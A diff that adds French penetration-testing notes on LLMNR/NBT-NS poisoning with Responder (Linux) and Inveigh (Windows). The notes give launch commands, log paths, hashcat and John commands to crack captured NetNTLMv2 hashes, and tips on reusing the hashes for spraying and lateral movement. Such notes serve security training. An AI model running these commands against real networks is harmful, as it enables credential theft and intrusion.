@@ -179,4 +179,151 @@ Filtre les résultats pour extraire les infos clés à documenter.
 
 ---
 
+# LLMNR/NBT-NS Poisoning – from Linux 
 
+## 1. Concept rapide
+
+> LLMNR/NBT-NS sont des protocoles de résolution utilisés par Windows quand DNS échoue. Ils sont vulnérables aux attaques Man-in-the-Middle (MITM) permettant de capturer des hash NTLM envoyés en broadcast.
+
+## 2. Outils principaux
+
+`Responder`  
+Outil Python pour empoisonner LLMNR, NBT-NS, MDNS et capturer des identifiants (hash NTLM).
+
+`Inveigh`  
+Outil cross-platform (C#, Powershell) pour spoofing/récolte de credentials via MITM.
+
+`Metasploit`  
+Dispose de modules pour les attaques de spoofing LLMNR/NBT-NS/SMB relay.
+
+## 3. Lancer Responder pour écouter & empoisonner
+
+`sudo responder -I <interface>`  
+Démarre Responder en mode poison sur l’interface réseau donnée, répond à LLMNR/NBT-NS/MDNS.
+
+`sudo responder -I <interface> -wrf`  
+Active aussi WPAD proxy (w), réponses NetBIOS wredir (r), et fingerprint des hôtes (f).
+
+`sudo responder -I <interface> -A`  
+Mode passif (analyse uniquement, aucune réponse/empoisonnement).
+
+## 4. Vérifier les ports ouverts nécessaires
+
+- UDP 137/138/53/1434/5355/5353
+- TCP 80/135/139/445/21/25/110/1433/3141/587/3128/389/1433
+
+> Certains modules de Responder nécessitent que ces ports soient libres sur la machine d’attaque.
+
+## 5. Résultats & fichiers de log
+
+`/usr/share/responder/logs/`  
+Les hash capturés sont sauvegardés ici, séparés par protocole/hôte.
+
+Ex :  
+`SMB-NTLMv2-SSP-172.16.5.25.txt`  
+`HTTP-NTLMv2-172.16.5.200.txt`
+
+## 6. Cracker les hash NetNTLMv2 avec Hashcat
+
+`hashcat -m 5600 <fichier_hash> <wordlist>`  
+Crack des hash NetNTLMv2 capturés avec Responder.
+
+> Ex :  
+`hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt`
+
+## 7. Exploit possible : SMB relay (non couvert ici)
+
+> Les hash capturés peuvent aussi parfois être relayés vers d’autres hôtes vulnérables pour une élévation de privilèges (SMB Relay), ou pour une authentification directe si le hash correspond à un compte admin.
+
+
+## 8. Conseils & bonnes pratiques
+
+- Faire tourner Responder dans un `tmux`/`screen` pour maximiser la récolte de hash.
+- Préférer l’utilisation d’un réseau de test/scope autorisé.
+- Toujours vérifier que Responder ne bloque pas des ports critiques pour ton propre accès.
+- Dès qu’un hash est cracké, tente la connexion sur un service exposé (SMB, RDP…).
+
+
+## 9. Exemples avancés
+
+`responder -I eth0 -wFv`  
+WPAD + force l’authentification NTLM/Basic sur proxy + mode verbeux.
+
+`john --format=netntlmv2 <hashfile> --wordlist=<wordlist>`  
+Crack avec John the Ripper si Hashcat indispo.
+
+---
+
+# LLMNR/NBT-NS Poisoning – from Windows
+
+## 1. Thème
+
+> Capturer des hash NTLM (et potentiellement des credentials clairs) sur un réseau Windows via l’empoisonnement LLMNR/NBT-NS avec Inveigh (PowerShell ou C#).
+
+## 2. Outil principal
+
+**Inveigh**  
+- PowerShell : Script original, idéal pour usage rapide et custom sur Windows.
+- C# (InveighZero) : Version compilée, maintenue, plus rapide et discrète.
+
+
+## 3. Lancer Inveigh (PowerShell)
+
+`Import-Module .\Inveigh.ps1`  
+Charge le module dans PowerShell.
+
+`Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y`  
+
+Démarre Inveigh : écoute LLMNR/NBT-NS, affiche à l’écran et écrit dans un fichier.  
+- `-LLMNR Y` : active l’empoisonnement LLMNR  
+- `-NBNS Y` : active l’empoisonnement NetBIOS Name Service  
+- `-ConsoleOutput Y` : affiche les résultats à l’écran  
+- `-FileOutput Y` : écrit les résultats dans un fichier (par défaut `C:\Tools`)
+
+`(Get-Command Invoke-Inveigh).Parameters`  
+Liste tous les paramètres possibles.
+
+## 4. Lancer Inveigh (C#)
+
+`.\Inveigh.exe`  
+Lance la version compilée, écoute les requêtes LLMNR/NBNS/SMB, affiche les captures.
+
+## 5. Résultats & logs
+
+- Hashes capturés et logs disponibles dans le dossier spécifié (`C:\Tools` par défaut)
+- La console affiche en temps réel les requêtes, hash capturés, etc.
+
+## 6. Console interactive (C#) – commandes utiles
+
+Quand Inveigh tourne, appuier sur `ESC` pour ouvrir la console et taper :
+
+- `GET NTLMV2UNIQUE` : Affiche les hash NTLMv2 uniques capturés.
+- `GET NTLMV1UNIQUE` : Affiche les hash NTLMv1 uniques.
+- `GET CLEARTEXT` : Affiche les credentials clairs capturés (rare mais possible).
+- `GET NTLMV2USERNAMES` : Liste les utilisateurs associés aux hash NTLMv2.
+- `STOP` : Arrête Inveigh.
+
+## 7. Exemples pratiques
+
+```powershell
+# Lancer Inveigh en mode complet depuis PowerShell
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+### Lancer InveighZero (C#) avec options par défaut
+.\Inveigh.exe
+
+## 8. Crack les hash récupérés
+
+`hashcat -m 5600 <hashfile> <wordlist>`
+Crack NetNTLMv2 capturés avec Hashcat (identique à la version Linux).
+
+## 9. Conseils & bonnes pratiques
+
+- Lancer PowerShell/Exe en tant qu’admin pour éviter les erreurs de port.
+- Surveiller les warnings : ports déjà pris, conflits éventuels.
+- Collecte continue : laisser tourner Inveigh pendant que tu fais autre chose.
+- Analyser tous les utilisateurs/hash récupérés pour du password spraying ou du lateral movement.
+- STOP ou Ctrl+C pour stopper la capture quand tu veux.
+
+---
